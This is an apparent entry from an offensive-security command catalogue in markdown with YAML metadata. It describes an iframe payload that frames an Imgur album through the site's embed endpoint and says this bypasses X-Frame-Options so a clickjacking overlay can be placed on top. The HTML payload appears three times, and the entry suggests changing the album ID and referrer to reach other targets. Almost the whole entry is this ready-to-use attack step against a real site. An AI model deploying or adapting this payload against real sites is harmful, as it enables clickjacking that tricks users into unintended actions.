---
id: cmd-iframe-clickjacking
data: >-
  <iframe
  src="http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540"></iframe>
tags:
  - clickjacking
  - iframe
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.856Z'
verified: false
validated: true
submitted: true
---
# iframe-clickjacking-setup

## Command

```html
<iframe src="http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540"></iframe>
```

## Description

Creates an iframe to frame the Imgur embed page, bypassing X-Frame-Options for ClickJacking by using the embed endpoint with public and referrer parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | URL of the embed endpoint with parameters for public view and referrer | Yes |

## Examples

### Basic Usage

```html
<iframe src="http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540"></iframe>
```

### Advanced Usage

Adjust album ID and referrer for different targets.

## Expected Output

Loads the Imgur page inside the iframe, allowing UI overlay.

## Related

- [[procedures/Setup-ClickJacking-Iframe-for-Imgur-Embed]]
